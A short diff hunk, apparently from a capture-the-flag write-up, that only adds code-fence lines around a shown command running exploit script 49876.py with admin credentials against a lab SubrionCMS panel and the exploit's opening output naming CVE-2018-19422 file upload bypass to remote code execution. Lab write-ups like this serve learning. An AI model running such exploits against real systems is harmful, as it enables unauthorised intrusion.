@@ -235,6 +235,8 @@ Why....(Japanese people...) 🤷‍♀️
 
 ```
 python3 49876.py -u http://10.10.53.38/subrion/panel/ -l admin -p S*******
+```
+```
 [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422
 
 [+] Trying to connect to: http://10.10.53.38/subrion/panel/
